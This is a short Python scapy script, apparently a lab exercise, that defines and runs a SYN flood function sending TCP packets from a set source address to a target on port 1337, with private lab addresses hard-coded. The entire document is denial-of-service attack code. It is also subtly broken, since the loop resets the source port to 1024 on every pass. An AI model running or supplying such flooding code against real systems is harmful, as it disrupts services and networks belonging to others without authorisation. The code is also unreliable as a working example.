from scapy.all import *
from scapy.layers.inet import TCP, IP
import time


def synFlood(src, tgt):

    for sport in range(1024, 65535):
        sport = 1024
        L3 = IP(src=src, dst=tgt)

        L4 = TCP(sport=sport, dport=1337)

        pkt = L3 / L4

        send(pkt)
        time.sleep(0.01)

src = "192.168.222.1"
tgt = "192.168.222.2"

synFlood(src, tgt)
